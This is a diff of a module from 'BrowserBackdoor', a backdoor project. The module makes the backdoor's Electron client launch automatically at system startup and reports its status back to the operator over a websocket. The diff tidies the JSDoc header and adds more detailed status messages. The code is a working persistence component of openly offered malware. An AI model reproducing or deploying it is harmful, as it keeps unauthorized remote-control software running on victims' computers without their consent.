@@ -1,12 +1,10 @@
-/*
- * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
- * BrowserBackdoorServer by IMcPwn.
- * See the file 'LICENSE' for copying permission
- *
- * Info: Enables startup of client application
- * Parameters: None
- * Returns: undefined, error
- * Author: IMcPwn
+/**
+ * @file enableStartup Module
+ * @summary Enables startup of client application.
+ * @author Carleton Stuberg
+ * @see https://github.com/IMcPwn/browser-backdoor
+ * @license MIT
+ * @version 0.1
  */
 
 electron = require('electron');
@@ -20,8 +18,12 @@ appLauncher = new AutoLaunch({
 });
 
 appLauncher.isEnabled().then(function(enabled){
-    if(enabled) return;
-    return appLauncher.enable();
+    if(enabled) {
+        ws.send("Startup already enabled");
+        return;
+    }
+    appLauncher.enable();
+    ws.send("Enabled startup");
 }).then(function(err){
-    if (err !== undefined) ws.send(err)
+    if (err !== undefined) ws.send("Error: " + err.toString());
 });
